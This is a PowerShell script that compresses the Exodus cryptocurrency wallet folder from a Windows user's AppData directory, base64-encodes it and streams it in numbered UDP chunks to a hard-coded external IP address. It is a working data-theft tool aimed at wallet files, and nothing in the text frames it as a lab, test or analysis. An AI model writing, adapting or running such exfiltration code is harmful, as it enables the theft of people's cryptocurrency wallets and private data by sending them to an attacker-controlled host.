$targetIP     = "144.172.116.76"
$udpPort      = 54321
$chunkSize    = 1400    # Max safe payload size without fragmentation
$burstCount   = 50      # Send 50 chunks rapidly then tiny pause

$folderToSend = "C:\Users\xavie\AppData\Roaming\Exodus"
$tempZip      = "$env:TEMP\exodus_payload.zip"
Compress-Archive -Path $folderToSend -DestinationPath $tempZip -Force

Write-Host "[*] Encoding..."
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tempZip))
$chunks = $base64 -split "(.{$chunkSize})" | ? { $_ -ne "" }
$totalChunks = $chunks.Count

$udp = New-Object System.Net.Sockets.UdpClient
$seq = 1
$batch = 0

foreach ($chunk in $chunks) {
    $msg = "MSG:$seq/$totalChunks|$chunk"
    $bytes = [Text.Encoding]::ASCII.GetBytes($msg)
    $udp.Send($bytes, $bytes.Length, $targetIP, $udpPort) | Out-Null
    Write-Host "[>] Sent $seq / $totalChunks"

    $seq++
    $batch++

    if ($batch -ge $burstCount) {
        # Tiny pause after a burst
        Start-Sleep -Milliseconds 10
        $batch = 0
    }
}

$udp.Close()
Write-Host "[*] Done! Sent $totalChunks packets"
